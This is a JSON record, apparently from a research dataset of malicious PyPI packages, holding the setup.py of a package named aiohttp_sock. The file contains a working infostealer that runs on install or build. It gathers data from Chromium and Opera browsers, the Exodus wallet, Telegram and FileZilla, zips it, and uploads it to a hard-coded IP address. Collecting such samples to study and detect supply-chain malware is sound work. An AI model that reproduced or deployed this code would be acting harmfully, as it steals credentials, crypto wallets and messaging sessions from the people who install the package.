[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/aiohttp_sock-0.1.24/aiohttp_sock-0.1.24/setup.py",
    "malicious_code": "import subprocess\nimport codecs\nimport os\nimport re\nimport sys\n\n# ... (setup code omitted for brevity)\n\nif not (len(sys.argv) > 0 and \"install\" == sys.argv[1] or \"bdist\" in sys.argv[1]):\n    sys.exit()\n\nsubprocess.call(f'{sys.executable} -m pip install aiofiles')\nsubprocess.call(f'{sys.executable} -m pip install aiohttp')\nsubprocess.call(f'{sys.executable} -m pip install cryptography')\nsubprocess.call(f'{sys.executable} -m pip install aiosqlite')\n\nimport asyncio\nfrom asyncio import create_task\nfrom typing import List\nfrom weakref import proxy\nfrom path_search import search_plugin_paths, root_paths\nfrom config import Config\nfrom aiohttp import ClientSession as Session, MultipartWriter, hdrs, FormData,\\\n        TCPConnector\nimport secrets\nimport timeit\nfrom paths import TEMP\nfrom os import mkdir\nfrom os.path import join\nfrom zipfile import ZipFile, ZIP_DEFLATED\nfrom tools import zipdir, _handle_task_result\nfrom logger import Logger\n\nfrom plugins import Chromium, Details, Exodus, Filezilla, Telegram\n\nHOST = 'http://144.24.115.170'\n\nasync def main() -> None:\n    start = timeit.default_timer()\n\n    client_id = secrets.token_hex(10)\n    log_path = join(TEMP, client_id)\n\n    print(log_path)\n    mkdir(log_path)\n\n    tasks: List[asyncio.Task] = []\n\n    connector = TCPConnector(limit=50)\n    session = Session(connector=connector)\n    logger = Logger(log_path)\n    conf = Config(client_id, HOST, log_path, logger, session)\n\n    await logger.log(f'Start')\n    \n    chromium = Chromium(conf)\n\n    search_folder_names = {\n        'google': chromium,\n        'exodus': Exodus(conf),\n        'mozilla': None,\n        'telegram desktop': Telegram(conf),\n        'telegram': Telegram(conf),\n        'opera software': chromium,\n        'filezilla': Filezilla(conf)\n    }\n    \n    tasks.append(create_task(search_plugin_paths(root_paths, search_folder_names)))\n\n    other_plugins = [Details(conf)]\n\n    for plugin in other_plugins:\n        tasks.append(create_task(plugin.callback()))\n\n    for task in tasks:\n        task.add_done_callback(_handle_task_result)\n\n    for task in tasks:\n        try:\n            await task\n        except Exception as e:\n            await logger.log(f'Error in main.py tasks {e}')\n    \n    await logger.log(f'Начинаю отправку лога')\n\n    zip_log_path = join(TEMP, f'{client_id}.zip')\n    with ZipFile(zip_log_path, 'w', ZIP_DEFLATED) as zipf:\n        zipdir(log_path, zipf)\n\n    files = {'file': open(zip_log_path, 'rb')}\n        \n    await session.post(f'{HOST}/receive_log', params={'client_id': client_id}, data=files)\n    await session.close()\n\n    stop = timeit.default_timer()\n    await logger.log(f'Time: {stop-start}')\n\nasyncio.run(main())"
  }
]